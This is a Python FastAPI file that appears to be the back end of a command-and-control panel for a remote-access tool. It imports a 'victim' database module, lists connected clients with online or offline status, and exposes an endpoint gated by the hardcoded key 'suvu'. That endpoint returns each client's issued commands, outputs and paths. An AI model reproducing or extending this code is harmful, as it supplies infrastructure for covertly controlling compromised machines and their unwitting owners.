from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from victim import db
from datetime import datetime


app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# Home Page


@app.get("/", response_class=HTMLResponse)
async def read_item(request: Request):
    time_duration = 60
    try:
        n = db.DB.collection.count_documents({})
        data = db.DB.collection.find()
        data = list(data)
        l = []
        for i in data:
            if i['_id'] != "client-1":
                l.append({
                    "_id": i['_id'],
                    "username": i["username"],
                    "time": i["time"].strftime("%Y-%m-%d %I:%M:%S %p"),
                    "status": "online" if (datetime.now() - i["time"]).total_seconds() <= time_duration else "offline"
                })
        return templates.TemplateResponse("index.html", {"request": request, "signal": True, "client": l, "no_of_client": n-1, "time_duration": time_duration})
    except:
        # return {"signal": False, "message": "AWS server is not responding please wait"}
        pass
        # return templates.TemplateResponse("index.html", {"request": request, "signal": False, "msg": "AWS server is not responding please wait "  "time_duration": time_duration})
    # return {"signal": True, "client": l, "no_of_client": n-1, "time_duration": time_duration}


@app.get("/api/{item_id}")
async def our_api_handeler(item_id):
    if item_id == 'suvu':
        try:
            n = db.DB.collection.count_documents({})
            alldata = db.DB.collection.find({})
            alldata = list(alldata)

            l = []
            for i in alldata:
                if i['_id'] != "client-1":
                    l.append({
                        "_id": i['_id'],
                        "input": i["input"],
                        "isIssued": i["isIssued"],
                        "output": i["output"],
                        "path": i["path"],
                        "time": i["time"],
                        "username": i["username"]
                    },)
            return {"status": True, "client": l, "no_of_client": n-1}
        except:
            return {"status": False, "msg": "Server not found (AWS hang-out)", "no_of_client": 0}
    return {"status": None, "msg": "You are not friend of suvendu"}


# @app.get("/delete/{item_id}")
# async def read_item(item_id):
#     return {"item_id": item_id}
